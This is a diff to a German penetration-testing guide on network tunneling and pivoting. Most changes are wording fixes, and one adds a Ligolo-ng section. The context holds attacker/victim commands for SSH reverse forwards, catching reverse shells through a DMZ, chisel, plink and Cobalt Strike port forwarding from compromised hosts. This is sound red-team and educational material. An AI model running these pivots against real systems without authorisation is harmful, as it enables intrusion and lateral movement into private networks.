@@ -47,7 +47,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Öffnen Sie einen neuen Port im SSH-Server --> Anderer Port
+Öffnen Sie neuen Port im SSH-Server --> Anderer Port
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 Dies ist nützlich, um Reverse-Shells von internen Hosts über eine DMZ zu Ihrem Host zu erhalten:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -174,7 +174,7 @@ Zu beachten:
 ### rPort2Port lokal
 
 {% hint style="warning" %}
-In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Verkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort an den angegebenen Host:Port
+In diesem Fall wird der **Port im Beacon-Host geöffnet**, nicht im Team-Server, und der **Verkehr wird an den Cobalt Strike-Client gesendet** (nicht an den Team-Server) und von dort an den angegebenen Host:Port.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Sie können es von der Release-Seite von [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
-Sie müssen die **gleiche Version für Client und Server** verwenden.
+Sie müssen die **gleiche Version für Client und Server verwenden**.
 
 ### socks
 ```bash
@@ -206,6 +206,42 @@ Sie müssen die **gleiche Version für Client und Server** verwenden.
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**Verwenden Sie dieselbe Version für Agent und Proxy**
+
+### Tunneling
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### Agent Binding und Listening
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -296,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Es ist wie eine Konsolen-PuTTY-Version (die Optionen sind sehr ähnlich zu einem ssh-Client).
 
-Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung herstellen können. Dann, um nur lokal zugängliche Ports auf einen Port in unserer Maschine weiterzuleiten:
+Da dieses Binary auf dem Opfer ausgeführt wird und es sich um einen ssh-Client handelt, müssen wir unseren ssh-Dienst und -Port öffnen, damit wir eine umgekehrte Verbindung haben können. Dann, um nur einen lokal zugänglichen Port auf einen Port in unserer Maschine weiterzuleiten:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -320,10 +356,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Sie müssen **RDP-Zugriff über das System** haben.\
 Herunterladen:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus der Remote-Desktop-Service-Funktion von Windows. DVC ist verantwortlich für **das Tunneln von Paketen über die RDP-Verbindung**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) aus der Remote Desktop Service-Funktion von Windows. DVC ist verantwortlich für **das Tunneln von Paketen über die RDP-Verbindung**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Laden Sie in Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
+Laden Sie in Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** so:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -416,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Ändern Sie den DNS von Proxychains
 
-Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen durch den SOCKS-Proxy. Standardmäßig ist der DNS-Server, den Proxychains verwendet, **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer **Windows-Umgebung** befinden, können Sie die IP des **Domänencontrollers** festlegen.
+Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen durch den SOCKS-Proxy. Standardmäßig ist der DNS-Server, den Proxychains verwendet, **4.2.2.2** (fest codiert). Um ihn zu ändern, bearbeiten Sie die Datei: _/usr/lib/proxychains3/proxyresolv_ und ändern Sie die IP. Wenn Sie sich in einer Windows-Umgebung befinden, können Sie die IP des **Domain Controllers** festlegen.
 
 ## Tunnel in Go
 
@@ -429,7 +465,7 @@ Proxychains intercepts `gethostbyname` libc call und tunnelt TCP-DNS-Anfragen du
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root wird in beiden Systemen benötigt, um Tun-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
+Root wird in beiden Systemen benötigt, um TUN-Adapter zu erstellen und Daten zwischen ihnen mithilfe von ICMP-Echo-Anfragen zu tunneln.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -454,7 +490,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 **[ngrok](https://ngrok.com/) ist ein Tool, um Lösungen mit einem einzigen Befehl ins Internet zu exponieren.**
-*Expositions-URIs sind wie:* **UID.ngrok.io**
+*Expositions-URI sind wie:* **UID.ngrok.io**
 
 ### Installation
 
